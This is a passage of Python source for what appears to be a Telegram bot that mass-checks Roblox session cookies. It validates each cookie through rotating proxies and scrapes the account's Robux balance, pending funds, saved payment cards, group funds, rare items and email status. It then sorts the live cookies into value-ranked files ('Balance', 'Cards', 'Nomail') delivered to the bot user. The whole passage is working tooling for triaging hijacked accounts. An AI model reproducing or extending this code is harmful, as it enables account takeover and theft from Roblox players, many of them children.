                                    name_data = await name_response.json()
                                    if name_data:
                                        badges_result.append(name_data.get('name', f'Badge {badge}'))
                            else:
                                badges_result.append(str(badge))
                except:
                    pass
            
            if badges_result:
                result['badges'] = ', '.join(badges_result)
        
        
        if gamepasses and check_params.get('gamepasses', True):
            gamepasses_result = []
            for gp in gamepasses:
                try:
                    async with session.get(
                        f'https://inventory.roblox.com/v1/users/{user_id}/items/1/{gp}/is-owned',
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as response:
                        response_text = await response.text()
                        if response_text.lower() == 'true':
                            if check_params.get('gamepasses_by_name', True):
                                async with session.get(
                                    f"https://apis.roblox.com/game-passes/v1/game-passes/{gp}/product-info",
                                    cookies={'.ROBLOSECURITY': cookie},
                                    proxy=proxy_url,
                                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                                ) as name_response:
                                    name_data = await name_response.json()
                                    if name_data:
                                        gamepasses_result.append(name_data.get('Name', f'Gamepass {gp}'))
                            else:
                                gamepasses_result.append(str(gp))
                except:
                    pass
            
            if gamepasses_result:
                result['gamepasses'] = ', '.join(gamepasses_result)
        
        
        if check_params.get('rap', True):
            result['rap'] = await check_rap(session, user_id, proxy)
        
        
        if check_params.get('rare_items', True):
            for item_id in TARGET_ITEMS:
                try:
                    async with session.get(
                        f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{item_id}',
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as response:
                        data = await response.json()
                        if data.get('data', []):
                            result['rare_items'][item_id] = len(data['data'])
                except:
                    pass
        
        
        if check_params.get('billing', True):
            result['billing'] = await check_billing(session, cookie, proxy)
        
        
        if check_params.get('country', True):
            try:
                async with session.get(
                    'https://users.roblox.com/v1/users/authenticated',
                    cookies={'.ROBLOSECURITY': cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 200:
                        user_data = await response.json()
                        result['country'] = user_data.get('countryCode', 'Unknown')
            except:
                pass
        
        
        if check_params.get('group_balance', True):
            try:
                async with session.get(
                    f'https://groups.roblox.com/v2/users/{user_id}/groups/roles',
                    cookies={'.ROBLOSECURITY': cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 200:
                        groups_data = await response.json()
                        total_group_balance = 0
                        for group in groups_data.get('data', []):
                            if group.get('role', {}).get('rank', 0) >= 255:  
                                group_id = group.get('group', {}).get('id')
                                if group_id:
                                    async with session.get(
                                        f'https://economy.roblox.com/v1/groups/{group_id}/currency',
                                        cookies={'.ROBLOSECURITY': cookie},
                                        proxy=proxy_url,
                                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                                    ) as currency_response:
                                        if currency_response.status == 200:
                                            currency_data = await currency_response.json()
                                            total_group_balance += currency_data.get('robux', 0)
                        result['group_balance'] = total_group_balance
            except:
                pass
        
        
        if check_params.get('place_visits', True):
            try:
                async with session.get(
                    f'https://games.roblox.com/v2/users/{user_id}/games',
                    cookies={'.ROBLOSECURITY': cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 200:
                        games_data = await response.json()
                        total_visits = 0
                        for game in games_data.get('data', []):
                            total_visits += game.get('placeVisits', 0)
                        result['place_visits'] = total_visits
            except:
                pass
        
        
        if check_params.get('ingame_donate', True):
            game_donations = {}
            game_settings = config.get('game_settings', DEFAULT_GAME_SETTINGS.copy())
            universe_cache = {}

            cursor = None
            all_transactions = []

            while True:
                params = {"limit": 100, "transactionType": 2}
                if cursor:
                    params["cursor"] = cursor

                async with session.get(
                    f"https://economy.roblox.com/v2/users/{user_id}/transactions",
                    params=params,
                    cookies={'.ROBLOSECURITY': cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as r:
                    if r.status != 200:
                        break
                    data = await r.json()
                    all_transactions.extend(data.get("data", []))
                    cursor = data.get("nextPageCursor")
                    if not cursor:
                        break

            for game_name, game_config in game_settings.items():
                if not game_config.get("enabled"):
                    continue

                place_id = game_config.get("game_id")
                if not place_id:
                    game_donations[game_name] = 0
                    continue

                if place_id not in universe_cache:
                    async with session.get(
                        f"https://apis.roblox.com/universes/v1/places/{place_id}/universe",
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as ur:
                        if ur.status == 200:
                            universe_cache[place_id] = (await ur.json()).get("universeId")
                        else:
                            universe_cache[place_id] = None

                universe_id = universe_cache[place_id]
                total = 0

                if universe_id:
                    for tx in all_transactions:
                        details = tx.get("details", {})
                        if details.get("universeId") == universe_id:
                            total += abs(tx.get("currency", {}).get("amount", 0))

                game_donations[game_name] = total

            result["game_donations"] = game_donations
                
        
        if check_params.get('playtime', True):
            playtime_data = {}
            playtime_settings = config.get('playtime_settings', DEFAULT_PLAYTIME_SETTINGS.copy())
            universe_cache = {}

            async with session.get(
                "https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-top-weekly-screentime-by-universe",
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as r:
                screentime_raw = {}
                if r.status == 200:
                    j = await r.json()
                    for x in j.get("universeWeeklyScreentimes", []):
                        screentime_raw[x["universeId"]] = x.get("weeklyMinutes", 0)

            for game_name, enabled in playtime_settings.items():
                if not enabled:
                    playtime_data[game_name] = 0
                    continue

                game_config = game_settings.get(game_name, {})
                if not game_config.get("enabled"):
                    playtime_data[game_name] = 0
                    continue

                place_id = game_config.get("game_id")
                if not place_id:
                    playtime_data[game_name] = 0
                    continue

                if place_id not in universe_cache:
                    async with session.get(
                        f"https://apis.roblox.com/universes/v1/places/{place_id}/universe",
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as ur:
                        if ur.status == 200:
                            universe_cache[place_id] = (await ur.json()).get("universeId")
                        else:
                            universe_cache[place_id] = None

                universe_id = universe_cache[place_id]
                playtime_data[game_name] = screentime_raw.get(universe_id, 0)

            result["playtime"] = playtime_data



        return result
        
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def check_rap(session: aiohttp.ClientSession, user_id: int, proxy: str = None):
    total_rap = 0
    next_cursor = None
    proxy_url = f"http://{proxy}" if proxy else None
    
    try:
        while True:
            url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100&sortOrder=Asc'
            if next_cursor:
                url += f'&cursor={next_cursor}'
            
            async with session.get(
                url,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 429:
                    await asyncio.sleep(1)
                    continue
                    
                data = await response.json()
                
                for item in data.get('data', []):
                    total_rap += item.get('recentAveragePrice', 0)
                
                next_cursor = data.get('nextPageCursor')
                if not next_cursor:
                    break
                    
    except Exception as e:
        logging.error(f"RAP check error: {e}")
    
    return total_rap

async def check_cookie_simple(session: aiohttp.ClientSession, cookie: str, proxies: list = None):
    retries = 0
    last_error = None
    used_proxies = set()
    
    while retries < MAX_RETRIES:
        proxy = None
        if proxies:
            available_proxies = [p for p in proxies if p not in used_proxies]
            if available_proxies:
                proxy = random.choice(available_proxies)
                used_proxies.add(proxy)
            else:
                used_proxies.clear()
                continue
        
        try:
            async with semaphore:
                result = await check_cookie_basic(session, cookie, proxy)
                if result['status'] == 'valid':
                    return result
                else:
                    last_error = result.get('message', 'Invalid cookie')
        except Exception as e:
            last_error = str(e)
            logging.warning(f"Attempt {retries+1} failed (proxy: {proxy}): {e}")
        
        retries += 1
        if retries < MAX_RETRIES:
            await asyncio.sleep(1)
    
    logging.error(f"All attempts failed: {last_error}")
    return {'status': 'invalid', 'message': last_error}

async def check_cookie_basic(session: aiohttp.ClientSession, cookie: str, proxy: str = None):
    try:
        proxy_url = f"http://{proxy}" if proxy else None
        
        async with session.get(
            'https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            proxy=proxy_url
        ) as response:
            if response.status == 401:
                return {'status': 'invalid'}
            if response.status != 200:
                return {'status': 'invalid'}
            
            return {'status': 'valid', 'cookie': cookie}
            
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def create_report_files(stats: dict, user_id: int, timestamp: str, check_params: dict):
    user_dir = f'{DATABASE_DIR}{user_id}/checks/{timestamp}/'
    os.makedirs(user_dir, exist_ok=True)

    def create_file(filename, data):
        path = f'{user_dir}{filename}.txt'
        
        with open(path, 'w', encoding='utf-8') as f:
            for item in data:
                
                line_parts = []
                
                
                line_parts.append(f"Name: {item.get('username', 'Unknown')}")
                line_parts.append(f"Id: {item.get('user_id', user_id)}")
                
                if check_params.get('balance', True):
                    line_parts.append(f"Balance: {item.get('balance', 0)}")
                
                if check_params.get('pending', True):
                    line_parts.append(f"Pending: {item.get('pending', 0)}")
                
                if check_params.get('donate_year', True):
                    line_parts.append(f"Donate: {abs(item.get('donate', 0))}")
                
                if check_params.get('donate_all_time', True):
                    line_parts.append(f"All-time donate: {abs(item.get('all_time_donate', 0))}")
                
                if check_params.get('rap', True):
                    line_parts.append(f"RAP: {item.get('rap', 0)}")
                
                if check_params.get('billing', True):
                    billing = item.get('billing', 'error')
                    line_parts.append(f"Billing: {billing}")
                
                if check_params.get('premium', True):
                    premium_str = 'true' if item.get('premium', False) else 'false'
                    line_parts.append(f"Premium: {premium_str}")
                
                if check_params.get('badges', True) and item.get('badges'):
                    badges_str = item['badges'] if item['badges'] else 'none'
                    line_parts.append(f"Badges: {badges_str}")
                
                if check_params.get('gamepasses', True) and item.get('gamepasses'):
                    gamepasses_str = item['gamepasses'] if item['gamepasses'] else 'none'
                    line_parts.append(f"Passes: {gamepasses_str}")
                
                if check_params.get('cards', True):
                    card_str = 'true' if item.get('card', False) else 'false'
                    line_parts.append(f"Cards: {card_str}")
                
                if check_params.get('email', True):
                    mail_str = 'true' if item.get('email', False) else 'false'
                    line_parts.append(f"Mail: {mail_str}")
                
                line_parts.append(f"2FA: False")
                line_parts.append(f"Trade: False")
                
                if item.get('creation_date'):
                    try:
                        year = item['creation_date'].split('.')[-1]
                        line_parts.append(f"Creation year: {year}")
                    except:
                        line_parts.append(f"Creation year: Unknown")
                
                if check_params.get('rare_items', True) and item.get('rare_items'):
                    rare_items_str = 'none'
                    if item['rare_items']:
                        rare_items_str = ', '.join([
                            f"{RARE_ITEMS_NAMES.get(int(item_id), f'Item {item_id}')} ({count})" 
                            for item_id, count in item['rare_items'].items()
                        ])
                    line_parts.append(f"Rare Items: {rare_items_str}")
                
                if check_params.get('country', True):
                    country = item.get('country', 'Unknown')
                    line_parts.append(f"Country: {country}")
                
                if check_params.get('group_balance', True):
                    group_balance = item.get('group_balance', 0)
                    line_parts.append(f"Group Balance: {group_balance}")
                
                if check_params.get('place_visits', True):
                    place_visits = item.get('place_visits', 0)
                    line_parts.append(f"Place Visits: {place_visits}")
                
                
                if check_params.get('ingame_donate', True) and item.get('game_donations'):
                    game_donations = item.get('game_donations', {})
                    if any(amount > 0 for amount in game_donations.values()):
                        donations_str = ', '.join([
                            f"{game}: {amount}R$" 
                            for game, amount in game_donations.items() 
                            if amount > 0
                        ])
                        line_parts.append(f"In-Game Donations: {donations_str}")
                    else:
                        line_parts.append(f"In-Game Donations: none")
                elif check_params.get('ingame_donate', True):
                    line_parts.append(f"In-Game Donations: none")
                
                
                if check_params.get('playtime', True) and item.get('playtime'):
                    playtime = item.get('playtime', {})
                    if any(time_played > 0 for time_played in playtime.values()):
                        playtime_str = ', '.join([
                            f"{game}: {time_played//3600}h{(time_played%3600)//60}m" 
                            for game, time_played in playtime.items() 
                            if time_played > 0
                        ])
                        line_parts.append(f"Playtime: {playtime_str}")
                    else:
                        line_parts.append(f"Playtime: none")
                elif check_params.get('playtime', True):
                    line_parts.append(f"Playtime: none")
                
                line_parts.append(f"Cookie: {item.get('cookie', '')}")
                
                
                line = " | ".join(line_parts)
                f.write(line + '\n')
        
        return path if os.path.getsize(path) > 0 else None

    files = {}
    
    
    if stats['valid_list']:
        files['valid'] = create_file('Valid', stats['valid_list'])
    
    
    if check_params.get('balance', True) and stats['balance_list']:
        files['balance'] = create_file('Balance', 
            sorted(stats['balance_list'], key=lambda x: x.get('balance', 0), reverse=True))
    
    if check_params.get('cards', True) and stats['cards_list']:
        files['cards'] = create_file('Cards', stats['cards_list'])
    
    if check_params.get('badges', True) and stats['badges_list']:
        files['badges'] = create_file('Badges', stats['badges_list'])
    
    if check_params.get('gamepasses', True) and stats['gamepasses_list']:
        files['gamepasses'] = create_file('Gamepasses', stats['gamepasses_list'])
    
    if check_params.get('pending', True) and stats['pending_list']:
        files['pending'] = create_file('Pending', 
            sorted(stats['pending_list'], key=lambda x: x.get('pending', 0), reverse=True))
    
    if check_params.get('email', True) and stats['nomail_list']:
        files['nomail'] = create_file('Nomail', stats['nomail_list'])
    
    if check_params.get('rap', True) and stats['rap_list']:
        files['rap'] = create_file('RAP', 
            sorted(stats['rap_list'], key=lambda x: x.get('rap', 0), reverse=True))
    
    if check_params.get('rare_items', True) and stats['rare_items_list']:
        files['rare_items'] = create_file('RareItems', stats['rare_items_list'])
    
    if check_params.get('donate_all_time', True) and stats['all_time_donate_list']:
        files['donate'] = create_file('All_Time_Donate', 
            sorted(stats['all_time_donate_list'], key=lambda x: x.get('all_time_donate', 0), reverse=True))
    
    if check_params.get('group_balance', True) and stats['group_balance_list']:
        files['group_balance'] = create_file('Group_Balance', 
            sorted(stats['group_balance_list'], key=lambda x: x.get('group_balance', 0), reverse=True))
    
    if check_params.get('place_visits', True) and stats['place_visits_list']:
        files['place_visits'] = create_file('Place_Visits', 
            sorted(stats['place_visits_list'], key=lambda x: x.get('place_visits', 0), reverse=True))
    
    
    if check_params.get('ingame_donate', True) and stats['game_donations_list']:
        
        game_donations_with_data = [
            item for item in stats['game_donations_list'] 
            if item.get('game_donations') and any(amount > 0 for amount in item['game_donations'].values())
        ]
        if game_donations_with_data:
            files['game_donations'] = create_file('Game_Donations', game_donations_with_data)
    
    
    if check_params.get('playtime', True) and stats['playtime_list']:
        
        playtime_with_data = [
            item for item in stats['playtime_list'] 
            if item.get('playtime') and any(time_played > 0 for time_played in item['playtime'].values())
        ]
        if playtime_with_data:
            files['playtime'] = create_file('Playtime', playtime_with_data)
    
    return {k: v for k, v in files.items() if v is not None}

import time
from datetime import datetime
from pytz import timezone

async def generate_report_text(stats: dict, start_time: float, check_params: dict):
    duration = time.time() - start_time
    minutes = int(duration // 60)
    seconds = int(duration % 60)
    duration_text = f"{minutes} мин {seconds} сек" if minutes > 0 else f"{seconds} сек"
    
    moscow_tz = timezone('Europe/Moscow')
    moscow_time = datetime.now(moscow_tz).strftime("%Y-%m-%d %H:%M:%S (MSK)")

    report_text = f"📊 <b>ОТЧЕТ О ПРОВЕРКЕ</b>\n\n"
    
    report_text += f"<b>Общие данные:</b>\n"
    report_text += f"├ Валидных: <code>{stats['valid']}</code>\n"
    report_text += f"├ Не валидных: <code>{stats['invalid']}</code>\n"
    report_text += f"└ Дубликатов: <code>{stats.get('duplicates', 0)}</code>\n\n"
    
    finance_items = []
    if check_params.get('balance', True):
        finance_items.append(f"Общий баланс: <code>{stats['total_balance']:,}</code> R$")
    
    if check_params.get('pending', True):
        finance_items.append(f"Общий пендинг: <code>{stats['total_pending']:,}</code> R$")
    
    if check_params.get('donate_year', True):
        finance_items.append(f"Донат (год): <code>{abs(stats['total_donate']):,}</code> R$")
    
    if check_params.get('donate_all_time', True):
        finance_items.append(f"All-time донат: <code>{abs(stats['total_all_time_donate']):,}</code> R$")
    
    if check_params.get('rap', True):
        finance_items.append(f"Общий RAP: <code>{stats['total_rap']:,}</code> R$")
    
    if finance_items:
        report_text += f"<b>Финансы:</b>\n"
        for i, item in enumerate(finance_items):
            if i == len(finance_items) - 1:
                report_text += f"└ {item}\n"
            else:
                report_text += f"├ {item}\n"
        report_text += "\n"
    
    account_items = []
    if check_params.get('premium', True):
        account_items.append(f"Премиум: <code>{stats['premium']}</code>")
    
    if check_params.get('cards', True):
        account_items.append(f"Карт: <code>{stats['total_cards']}</code>")
    
    if check_params.get('email', True):
        account_items.append(f"Без почты: <code>{len(stats['nomail_list'])}</code>")
    
    if check_params.get('badges', True):
        account_items.append(f"Бейджей: <code>{stats['badges_found']}</code>")
    
    if check_params.get('gamepasses', True):
        account_items.append(f"Геймпассов: <code>{stats['gamepasses_found']}</code>")
    
    if account_items:
        report_text += f"<b>Статистика аккаунтов:</b>\n"
        for i, item in enumerate(account_items):
            if i == len(account_items) - 1:
                report_text += f"└ {item}\n"
            else:
                report_text += f"├ {item}\n"
    
    additional_sections = []
    
    if check_params.get('group_balance', True) and stats['total_group_balance'] > 0:
        additional_sections.append(f"<b>Баланс групп:</b>\n└ Общий баланс: <code>{stats['total_group_balance']:,}</code> R$")
    
    if check_params.get('place_visits', True) and stats['total_place_visits'] > 0:
        additional_sections.append(f"<b>Визиты плейсов:</b>\n└ Всего визитов: <code>{stats['total_place_visits']:,}</code>")
    
    if check_params.get('ingame_donate', True) and stats['total_game_donations']:
        game_donations_text = "<b>In-Game Donations:</b>\n"
        total_game_donate = 0
        game_items = []
        
        for game_name, amount in stats['total_game_donations'].items():
            if amount > 0:
                game_items.append(f"{game_name}: <code>{amount:,}</code> R$")
                total_game_donate += amount
        
        if game_items:
            for i, item in enumerate(game_items):
                if i == len(game_items) - 1:
                    game_donations_text += f"├ {item}\n"
                else:
                    game_donations_text += f"├ {item}\n"
            game_donations_text += f"└ Всего: <code>{total_game_donate:,}</code> R$"
            additional_sections.append(game_donations_text)
    
    if check_params.get('playtime', True) and stats['total_playtime']:
        playtime_text = "<b>Время игры:</b>\n"
        playtime_items = []
        
        for game_name, time_played in stats['total_playtime'].items():
            if time_played > 0:
                hours = time_played // 3600
                minutes = (time_played % 3600) // 60
                playtime_items.append(f"{game_name}: <code>{hours}h {minutes}m</code>")
        
        if playtime_items:
            for i, item in enumerate(playtime_items):
                if i == len(playtime_items) - 1:
                    playtime_text += f"└ {item}\n"
                else:
                    playtime_text += f"├ {item}\n"
            additional_sections.append(playtime_text)
    
    RARE_ITEMS_NAMES = {}
    
    if check_params.get('rare_items', True) and stats['rare_items_list']:
        rare_items_summary = []
        for item in stats['rare_items_list']:
            if item.get('rare_items'):
                for item_id, count in item['rare_items'].items():
                    item_name = RARE_ITEMS_NAMES.get(int(item_id), f'Item {item_id}')
                    rare_items_summary.append(f"{item_name} ({count})")
        
        if rare_items_summary:
            rare_items_text = "<b>Редкие предметы:</b>\n"
            rare_items_display = []
            
            for i, item in enumerate(rare_items_summary):
                rare_items_display.append(item)
            
            if len(rare_items_display) > 5:
                rare_items_display = rare_items_display[:5]
                rare_items_display.append(f"... и ещё {len(rare_items_summary) - 5}")
            
            for i, item in enumerate(rare_items_display):
                if i == len(rare_items_display) - 1:
                    rare_items_text += f"└ {item}\n"
                else:
                    rare_items_text += f"├ {item}\n"
            
            additional_sections.append(rare_items_text)
    
    if check_params.get('billing', True) and stats['total_billing']:
        billing_summary = []
        for currency, amount in stats['total_billing'].items():
            billing_summary.append(f"{amount:.2f} {currency}")
        
        if billing_summary:
            billing_text = "\n<b>Билинг (карты):</b>\n"
            
            if len(billing_summary) == 1:
                billing_text += f"└ {billing_summary[0]}\n"
            else:
                for i, item in enumerate(billing_summary):
                    if i == len(billing_summary) - 1:
                        billing_text += f"└ {item}\n"
                    else:
                        billing_text += f"├ {item}\n"
            
            additional_sections.append(billing_text)
    
    if additional_sections:
        report_text += "\n"
        for section in additional_sections:
            report_text += f"{section}\n"
    
    report_text += f"\n<b>Время выполнения:</b>\n└ {duration_text}\n"
    report_text += f"══════════════════"
    
    return report_text


async def generate_game_check_report(stats: dict, user_id: int, message: Message, start_time: float, game_name: str):
    """Генерирует отчет для игра-специфичной проверки"""
    try:
        check_duration = time.time() - start_time
        duration_text = f"{int(check_duration // 60)}m {int(check_duration % 60)}s"
        
        valid_count = stats['valid']
        invalid_count = stats['invalid']
        badges_found = stats.get('badges_found', 0)
        gamepasses_found = stats.get('gamepasses_found', 0)
        
        logging.info(f"Game check report for {game_name}: valid={valid_count}, invalid={invalid_count}, valid_list_len={len(stats.get('valid_list', []))}")
        
        # Получаем класс игры для получения названий бейджей и геймпассов
        game_class = globals().get(game_name)
        badge_names_map = {}
        gp_names_map = {}
        
        if game_class:
            if hasattr(game_class, 'Badges') and hasattr(game_class.Badges, 'listOfBadges'):
                for badge in game_class.Badges.listOfBadges:
                    if isinstance(badge, (tuple, list)):
                        badge_names_map[badge[1]] = badge[0]  # ID -> Name
            
            if hasattr(game_class, 'Gamepasses') and hasattr(game_class.Gamepasses, 'listOfGamepasses'):
                for gp in game_class.Gamepasses.listOfGamepasses:
                    if isinstance(gp, (tuple, list)):
                        gp_names_map[gp[1]] = gp[0]  # ID -> Name
        
        # Собираем все найденные бейджи и геймпассы
        all_badges = {}
        all_gamepasses = {}
        
        for result in stats.get('valid_list', []):
            badges = result.get('badges_found', [])
            gamepasses = result.get('gamepasses_found', [])
            
            for badge_id in badges:
                badge_name = badge_names_map.get(badge_id, f"Badge {badge_id}")
                if badge_name not in all_badges:
                    all_badges[badge_name] = 0
                all_badges[badge_name] += 1
            
            for gp_id in gamepasses:
                gp_name = gp_names_map.get(gp_id, f"Gamepass {gp_id}")
                if gp_name not in all_gamepasses:
                    all_gamepasses[gp_name] = 0
                all_gamepasses[gp_name] += 1
        
        report_text = f"📊 <b>ОТЧЕТ О ПРОВЕРКЕ ИГРЫ</b>\n\n"
        
        # Общие данные
        report_text += f"<b>Игра:</b>\n"
        report_text += f"└ <code>{game_name}</code>\n\n"
        
        report_text += f"<b>Статистика проверки:</b>\n"
        report_text += f"├ Всего куки: <code>{valid_count + invalid_count:,}</code>\n"
        report_text += f"├ Валидные: <code>{valid_count:,}</code>\n"
        report_text += f"└ Невалидные: <code>{invalid_count:,}</code>\n\n"
        
        # Найденные бейджи и геймпассы
        items = []
        
        if all_badges:
            badges_text = f"<b>Найденные бейджи:</b>\n"
            badge_list = sorted(all_badges.items())
            for i, (badge_name, count) in enumerate(badge_list):
                if i == len(badge_list) - 1:
                    badges_text += f"└ <code>{badge_name}</code> - <b>{count}</b>\n"
                else:
                    badges_text += f"├ <code>{badge_name}</code> - <b>{count}</b>\n"
            items.append(badges_text)
        
        if all_gamepasses:
            gp_text = f"<b>Найденные геймпассы:</b>\n"
            gp_list = sorted(all_gamepasses.items())
            for i, (gp_name, count) in enumerate(gp_list):
                if i == len(gp_list) - 1:
                    gp_text += f"└ <code>{gp_name}</code> - <b>{count}</b>\n"
                else:
                    gp_text += f"├ <code>{gp_name}</code> - <b>{count}</b>\n"
            items.append(gp_text)
        
        for item in items:
            report_text += item + "\n"
        
        report_text += f"<b>Время проверки:</b>\n"
        report_text += f"└ <code>{duration_text}</code>\n\n"
        
        # Добавляем список кук с результатами в столбик
        valid_results = stats.get('valid_list', [])
        if valid_results:
            report_text += f"<b>Результаты по кукам:</b>\n\n"
            
            for idx, result in enumerate(valid_results, 1):
                username = result.get('username', 'Unknown')
                badges = result.get('badges_found', [])
                gamepasses = result.get('gamepasses_found', [])
                
                report_text += f"<b>{idx}. {username}</b>\n"
                
                if badges:
                    report_text += f"├ 🏅 <b>Бейджи:</b>\n"
                    for b_idx, badge_id in enumerate(badges):
                        badge_name = badge_names_map.get(badge_id, f"Badge {badge_id}")
                        if b_idx == len(badges) - 1:
                            report_text += f"│  └ <code>{badge_name}</code>\n"
                        else:
                            report_text += f"│  ├ <code>{badge_name}</code>\n"
                
                if gamepasses:
                    if badges:
                        report_text += f"└ 🎮 <b>Геймпассы:</b>\n"
                    else:
                        report_text += f"├ 🎮 <b>Геймпассы:</b>\n"
                    for g_idx, gp_id in enumerate(gamepasses):
                        gp_name = gp_names_map.get(gp_id, f"Gamepass {gp_id}")
                        if g_idx == len(gamepasses) - 1:
                            if badges:
                                report_text += f"   └ <code>{gp_name}</code>\n"
                            else:
                                report_text += f"   └ <code>{gp_name}</code>\n"
                        else:
                            if badges:
                                report_text += f"   ├ <code>{gp_name}</code>\n"
                            else:
                                report_text += f"   ├ <code>{gp_name}</code>\n"
                
                if idx < len(valid_results):
                    report_text += "\n"
        
        await bot.send_sticker(user_id, STICKERS['success'])
        await message.answer(report_text, parse_mode=ParseMode.HTML)
        
        # Сохраняем результаты в файл
        timestamp = datetime.now().strftime("%d%m%Y%H%M%S")
        user_dir = f'{DATABASE_DIR}{user_id}/game_checks/{game_name}/'
        os.makedirs(user_dir, exist_ok=True)
        
        results_file = f"{user_dir}check_{timestamp}.txt"
        with open(results_file, 'w', encoding='utf-8') as f:
            f.write(f"Time: {duration_text} | Game: {game_name} | ")
            f.write(f"Cookies: {valid_count + invalid_count} | Valid: {valid_count} | Invalid: {invalid_count} |")
            
            # Вывод кук в формате pipe
            for result in stats.get('valid_list', []):
                line_parts = []
                
                username = result.get('username', 'Unknown')
                line_parts.append(f"Username: {username}")
                
                badges = result.get('badges_found', [])
                gamepasses = result.get('gamepasses_found', [])
                
                if badges:
                    badges_str = ', '.join([
                        badge_names_map.get(badge_id, f"Badge {badge_id}")
                        for badge_id in badges
                    ])
                    line_parts.append(f"Badges: {badges_str}")
                else:
                    line_parts.append(f"Badges: none")
                
                if gamepasses:
                    gamepasses_str = ', '.join([
                        gp_names_map.get(gp_id, f"Gamepass {gp_id}")
                        for gp_id in gamepasses
                    ])
                    line_parts.append(f"Gamepasses: {gamepasses_str}")
                else:
                    line_parts.append(f"Gamepasses: none")
                
                line_parts.append(f"Cookie: {result.get('cookie', '')}")
                
                line = " | ".join(line_parts)
                f.write(line + '\n')
        
        # Отправляем файл
        if os.path.exists(results_file):
            await bot.send_document(
                chat_id=user_id,
                document=FSInputFile(results_file),
                caption=f"📄 <b>Полный отчет проверки {game_name}</b>",
                parse_mode=ParseMode.HTML
            )
            
            # Удаляем временный файл
            os.remove(results_file)
        
    except Exception as e:
        logging.error(f"Ошибка генерации отчета для игры: {e}")
        await message.answer(
            f"❌ <b>ОШИБКА ФОРМИРОВАНИЯ ОТЧЕТА</b>\n\n"
            f"<i>Проверка завершена, но при формировании отчета произошла ошибка.</i>",
            parse_mode=ParseMode.HTML
        )

async def generate_report(stats: dict, user_id: int, message: Message, start_time: float, check_params: dict):
    try:
        timestamp = datetime.now().strftime("%d%m%Y%H%M%S")
        
        user_dir = f'{DATABASE_DIR}{user_id}/checks/{timestamp}/'
        os.makedirs(user_dir, exist_ok=True)
        
        files = await create_report_files(stats, user_id, timestamp, check_params)
        report_text = await generate_report_text(stats, start_time, check_params)
        check_duration = time.time() - start_time
        await bot.send_sticker(user_id, STICKERS['success'])
        
        config = Database.get_user_config(user_id)
        output_format = config.get('output_format', DEFAULT_OUTPUT_FORMAT.copy())
        
        zip_enabled = output_format.get('zip', True)
        txt_enabled = output_format.get('txt', False)
        
        if zip_enabled:
            zip_file_path = f"{user_dir}report_{timestamp}.zip"
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_type, file_path in files.items():
                    if os.path.exists(file_path):
                        zipf.write(file_path, arcname=f"{file_type}.txt")
            
            await bot.send_document(
                chat_id=user_id,
                document=FSInputFile(zip_file_path),
                caption=report_text,
                parse_mode=ParseMode.HTML
            )
            
            if os.path.exists(zip_file_path):
                os.remove(zip_file_path)
            
        elif txt_enabled:
            if files:
                media_group = []
                for i, (file_type, file_path) in enumerate(files.items()):
                    if i == 0:
                        media_group.append(InputMediaDocument(
                            media=FSInputFile(file_path),
                            caption=report_text,
                            parse_mode=ParseMode.HTML
                        ))
                    else:
                        media_group.append(InputMediaDocument(
                            media=FSInputFile(file_path)
                        ))
                
                await bot.send_media_group(
                    chat_id=user_id,
                    media=media_group
                )
            else:
                await message.answer(report_text, parse_mode=ParseMode.HTML)
        else:
            if 'valid' in files:
                await bot.send_document(
                    chat_id=user_id,
                    document=FSInputFile(files['valid']),
                    caption=report_text,
                    parse_mode=ParseMode.HTML
                )
            else:
                await message.answer(report_text, parse_mode=ParseMode.HTML)
        
        user_config = Database.get_user_config(user_id)
        username = user_config.get('username', 'none')
        
        config = Database.get_user_config(user_id)
        Database.update_config(user_id, 'cookie_check_count', config['cookie_check_count'] + 1)
        Database.update_config(user_id, 'total_checks', config.get('total_checks', 0) + stats['valid'] + stats['invalid'])
        Database.update_config(user_id, 'valid_cookies_found', config.get('valid_cookies_found', 0) + stats['valid'])
        Database.update_config(user_id, 'invalid_cookies_found', config.get('invalid_cookies_found', 0) + stats['invalid'])
            
    except Exception as e:
        await bot.send_sticker(user_id, STICKERS['error'])
        await message.answer(
            f"❌ <b>Ошибка генерации отчета:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
        logging.error(f"Ошибка генерации отчета: {e}")

async def process_queue():
    global current_checking, active_tasks
    while True:
        if not check_queue.empty() and current_checking is None:
            current_checking = check_queue.get()
            # Распаковка из приоритетной очереди: (priority, user_id, file_info, message)
            priority, user_id, file_info, message = current_checking
            start_time = time.time()
            
            try:
                config = Database.get_user_config(user_id)
                proxies = Database.load_proxies()
                
                # Проверяем, это ли проверка конкретной игры или обычная проверка
